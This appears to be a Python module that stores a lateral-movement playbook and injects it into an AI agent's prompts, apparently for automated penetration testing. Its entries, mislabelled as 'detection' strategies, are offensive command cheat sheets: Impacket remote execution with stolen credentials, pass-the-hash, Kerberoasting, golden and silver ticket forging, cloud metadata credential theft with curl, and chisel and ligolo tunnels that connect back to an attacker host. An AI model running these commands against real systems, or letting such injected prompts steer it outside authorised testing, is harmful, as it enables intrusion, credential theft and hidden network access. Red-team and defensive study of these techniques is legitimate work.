"""Lateral movement knowledge base.

Deep knowledge about lateral movement:
1. Windows lateral movement
2. Linux/Unix lateral movement
3. Cloud lateral movement
4. Active Directory pivoting
5. Network pivoting and tunneling
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

import structlog

logger = structlog.get_logger()


@dataclass
class LateralPattern:
    """A lateral movement pattern."""
    pattern_id: str = ""
    name: str = ""
    category: str = ""
    severity: str = "critical"
    description: str = ""
    detection_strategy: str = ""
    tools: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.pattern_id,
            "name": self.name[:25],
            "category": self.category[:12],
        }


LATERAL_PATTERNS: list[dict[str, Any]] = [
    {
        "id": "lm-001", "name": "Windows Lateral Movement",
        "category": "windows", "severity": "critical",
        "desc": "Windows lateral movement techniques.",
        "detection": (
            "WINDOWS LATERAL MOVEMENT:\n"
            "PSEXEC:\n"
            "  # Impacket psexec\n"
            "  psexec.py DOMAIN/user:pass@TARGET\n"
            "  # Metasploit\n"
            "  use exploit/windows/smb/psexec\n"
            "  # Requires: SMB (445), admin creds\n"
            "WMI:\n"
            "  # wmiexec (Impacket)\n"
            "  wmiexec.py DOMAIN/user:pass@TARGET\n"
            "  # PowerShell\n"
            "  Invoke-WmiMethod -ComputerName TARGET ...\n"
            "  # Semi-interactive, no binary drop\n"
            "WINRM:\n"
            "  # evil-winrm\n"
            "  evil-winrm -i TARGET -u user -p pass\n"
            "  # Requires port 5985/5986\n"
            "RDP:\n"
            "  # xfreerdp\n"
            "  xfreerdp /v:TARGET /u:user /p:pass\n"
            "  # Restricted Admin mode (no creds on target)\n"
            "  # SharpRDP (command execution via RDP)\n"
            "DCOM:\n"
            "  # dcomexec (Impacket)\n"
            "  dcomexec.py DOMAIN/user:pass@TARGET\n"
            "  # Uses DCOM objects (MMC20.Application)\n"
            "SCM:\n"
            "  # smbexec (Impacket)\n"
            "  smbexec.py DOMAIN/user:pass@TARGET\n"
            "  # Creates/starts service via SCM\n"
            "PASS-THE-HASH:\n"
            "  # Use NTLM hash instead of password\n"
            "  psexec.py -hashes :HASH DOMAIN/user@TARGET\n"
            "TOOLS:\n"
            "  Impacket, evil-winrm, CrackMapExec"
        ),
        "tools": ["crackmapexec"],
    },
    {
        "id": "lm-002", "name": "Linux/Unix Lateral Movement",
        "category": "linux", "severity": "high",
        "desc": "Linux lateral movement techniques.",
        "detection": (
            "LINUX LATERAL MOVEMENT:\n"
            "SSH:\n"
            "  # Key-based\n"
            "  ssh -i stolen_key user@TARGET\n"
            "  # Agent forwarding abuse\n"
            "  ssh -A user@TARGET  # Forward agent\n"
            "  # ProxyJump (multi-hop)\n"
            "  ssh -J jump_host user@TARGET\n"
            "  # SSH hijacking (ControlMaster)\n"
            "  # Steal SSH agent socket\n"
            "ANSIBLE/AUTOMATION:\n"
            "  - Abuse Ansible playbooks\n"
            "  - Puppet/Chef exploitation\n"
            "  - SaltStack command injection\n"
            "  - Jenkins agent abuse\n"
            "NETWORK SERVICES:\n"
            "  - NFS shares (no_root_squash)\n"
            "  - NIS/YP exploitation\n"
            "  - LDAP enumeration\n"
            "  - Samba/CIFS shares\n"
            "  - rsh/rlogin (legacy)\n"
            "CREDENTIAL REUSE:\n"
            "  - /etc/shadow (if readable)\n"
            "  - .bash_history credentials\n"
            "  - SSH keys in home dirs\n"
            "  - Config files with passwords\n"
            "  - Database connection strings\n"
            "  - Environment variables\n"
            "  - Kubernetes secrets\n"
            "CONTAINERS:\n"
            "  - Docker socket access\n"
            "  - Kubernetes pod pivoting\n"
            "  - Container escape → host\n"
            "TOOLS:\n"
            "  SSH, Ansible, LinPEAS"
        ),
        "tools": ["ssh"],
    },
    {
        "id": "lm-003", "name": "Cloud Lateral Movement",
        "category": "cloud", "severity": "critical",
        "desc": "Cloud environment lateral movement.",
        "detection": (
            "CLOUD LATERAL MOVEMENT:\n"
            "AWS:\n"
            "  - IAM role chaining\n"
            "  - Cross-account role assumption\n"
            "  - EC2 instance profile abuse\n"
            "  - Lambda function pivoting\n"
            "  - SSM Session Manager\n"
            "  - S3 bucket credential harvesting\n"
            "  - Metadata service (169.254.169.254)\n"
            "  # IMDS v1 exploitation\n"
            "  curl http://169.254.169.254/latest/meta-data/\n"
            "  # Get instance role credentials\n"
            "  curl http://169.254.169.254/latest/meta-data/iam/...\n"
            "AZURE:\n"
            "  - Managed Identity token theft\n"
            "  - Service Principal abuse\n"
            "  - Runbook exploitation\n"
            "  - Azure VM agent\n"
            "  - Key Vault access chaining\n"
            "  - Subscription pivoting\n"
            "GCP:\n"
            "  - Service account impersonation\n"
            "  - Metadata server abuse\n"
            "  - Cloud Function pivoting\n"
            "  - GKE node compromise\n"
            "  - Project hopping\n"
            "KUBERNETES:\n"
            "  - Service account token abuse\n"
            "  - RBAC privilege escalation\n"
            "  - etcd direct access\n"
            "  - Kubelet API abuse\n"
            "  - Pod-to-pod pivoting\n"
            "TOOLS:\n"
            "  Pacu (AWS), ROADtools (Azure), ScoutSuite"
        ),
        "tools": ["pacu"],
    },
    {
        "id": "lm-004", "name": "Active Directory Pivoting",
        "category": "ad", "severity": "critical",
        "desc": "Active Directory pivoting techniques.",
        "detection": (
            "ACTIVE DIRECTORY PIVOTING:\n"
            "KERBEROS:\n"
            "  # Kerberoasting\n"
            "  GetUserSPNs.py DOMAIN/user:pass -dc-ip DC_IP\n"
            "  # AS-REP Roasting\n"
            "  GetNPUsers.py DOMAIN/ -dc-ip DC_IP -no-pass\n"
            "  # Pass-the-Ticket\n"
            "  export KRB5CCNAME=ticket.ccache\n"
            "  psexec.py -k DOMAIN/user@TARGET\n"
            "  # Overpass-the-Hash\n"
            "  getTGT.py DOMAIN/user -hashes :HASH\n"
            "  # Golden Ticket\n"
            "  ticketer.py -nthash KRBTGT_HASH -domain DOMAIN ...\n"
            "  # Silver Ticket\n"
            "  ticketer.py -nthash SVC_HASH -domain DOMAIN ...\n"
            "ACL ABUSE:\n"
            "  - WriteDacl → add permissions\n"
            "  - WriteOwner → take ownership\n"
            "  - GenericAll → full control\n"
            "  - GenericWrite → modify attributes\n"
            "  - ForceChangePassword\n"
            "  - AddMember → add to group\n"
            "DELEGATION:\n"
            "  - Unconstrained delegation\n"
            "  - Constrained delegation (S4U)\n"
            "  - RBCD (Resource-Based Constrained)\n"
            "TRUST:\n"
            "  - Inter-domain trust abuse\n"
            "  - Forest trust exploitation\n"
            "  - SID History injection\n"
            "TOOLS:\n"
            "  BloodHound, Impacket, Rubeus, PowerView"
        ),
        "tools": ["bloodhound"],
    },
    {
        "id": "lm-005", "name": "Network Pivoting and Tunneling",
        "category": "pivoting", "severity": "high",
        "desc": "Network pivoting and tunneling.",
        "detection": (
            "NETWORK PIVOTING AND TUNNELING:\n"
            "SSH TUNNELING:\n"
            "  # Local port forward\n"
            "  ssh -L 8080:internal:80 user@pivot\n"
            "  # Remote port forward\n"
            "  ssh -R 9090:localhost:80 user@pivot\n"
            "  # Dynamic SOCKS proxy\n"
            "  ssh -D 1080 user@pivot\n"
            "  # ProxyChains config\n"
            "  # socks5 127.0.0.1 1080\n"
            "CHISEL:\n"
            "  # Server\n"
            "  ./chisel server -p 8080 --reverse\n"
            "  # Client (reverse SOCKS)\n"
            "  ./chisel client SERVER:8080 R:socks\n"
            "  # Client (specific port)\n"
            "  ./chisel client SERVER:8080 R:8443:INTERNAL:443\n"
            "LIGOLO-NG:\n"
            "  # Agent on target\n"
            "  ./agent -connect ATTACKER:11601\n"
            "  # Proxy on attacker\n"
            "  ./proxy -selfcert\n"
            "  # Creates tun interface for routing\n"
            "SOCAT:\n"
            "  # Port relay\n"
            "  socat TCP-LISTEN:8080,fork TCP:INTERNAL:80\n"
            "METASPLOIT:\n"
            "  # Auto-route through session\n"
            "  use post/multi/manage/autoroute\n"
            "  # SOCKS proxy\n"
            "  use auxiliary/server/socks_proxy\n"
            "DOUBLE PIVOTING:\n"
            "  - Chain multiple tunnels\n"
            "  - ProxyChains multiple hops\n"
            "  - Meterpreter route chaining\n"
            "TOOLS:\n"
            "  Chisel, Ligolo-ng, SSH, socat, proxychains"
        ),
        "tools": ["chisel"],
    },
]


class LateralMovementKB:
    """Lateral movement knowledge base.

    Provides lateral movement patterns
    injected into agent prompts.
    """

    def __init__(self) -> None:
        self._patterns: dict[str, LateralPattern] = {}
        self._log = logger.bind(component="lateral_kb")
        self._load_patterns()

    def _load_patterns(self) -> None:
        """Load lateral movement patterns."""
        for data in LATERAL_PATTERNS:
            pattern = LateralPattern(
                pattern_id=data["id"],
                name=data["name"],
                category=data.get("category", ""),
                severity=data.get("severity", "critical"),
                description=data.get("desc", ""),
                detection_strategy=data.get("detection", ""),
                tools=data.get("tools", []),
            )
            self._patterns[pattern.pattern_id] = pattern

    def get_by_category(self, category: str) -> list[LateralPattern]:
        """Get patterns by category."""
        return [
            p for p in self._patterns.values()
            if p.category.lower() == category.lower()
        ]

    def build_lateral_prompt(
        self,
        categories: list[str] | None = None,
        max_patterns: int = 4,
    ) -> str:
        """Build lateral movement prompt."""
        lines = ["## Lateral Movement\n"]
        count = 0
        for pattern in self._patterns.values():
            if categories and pattern.category.lower() not in [c.lower() for c in categories]:
                continue
            if count >= max_patterns:
                break
            lines.append(f"### {pattern.name} [{pattern.category.upper()}]")
            lines.append(pattern.detection_strategy)
            lines.append("")
            count += 1
        return "\n".join(lines)

    def get_stats(self) -> dict[str, Any]:
        cat_counts: dict[str, int] = {}
        for p in self._patterns.values():
            cat_counts[p.category] = cat_counts.get(p.category, 0) + 1
        return {
            "patterns": len(self._patterns),
            "by_category": cat_counts,
        }
